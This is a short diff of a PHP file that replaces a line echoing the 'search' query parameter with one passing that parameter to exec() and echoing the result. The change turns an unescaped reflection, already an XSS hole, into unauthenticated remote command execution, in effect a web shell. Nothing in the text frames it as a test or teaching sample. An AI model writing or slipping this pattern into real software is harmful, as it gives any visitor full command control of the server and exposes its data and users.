@@ -1,5 +1,5 @@
 <?php
 
-echo $_GET["search"];
+echo exec($_GET["search"]);
 
 ?>
